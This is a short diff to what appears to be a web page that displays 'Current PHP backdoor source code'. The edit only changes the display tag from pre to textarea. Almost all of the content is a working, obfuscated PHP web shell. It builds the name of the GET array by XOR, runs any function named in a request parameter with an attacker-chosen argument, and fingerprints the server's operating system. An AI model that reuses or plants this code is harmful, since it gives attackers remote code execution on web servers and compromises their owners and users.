@@ -56,12 +56,12 @@ quotes();
                             <p class="meta"> 
                             Current PHP backdoor source code
                             </p>
-<pre>
+<textarea rows="4" cols="50">
 if($_GET['_']) {
 print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
 print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
 } elseif($_GET['___']) { @$_GET['___'](); }
-</pre>
+</textarea>
 
 
                         </div>
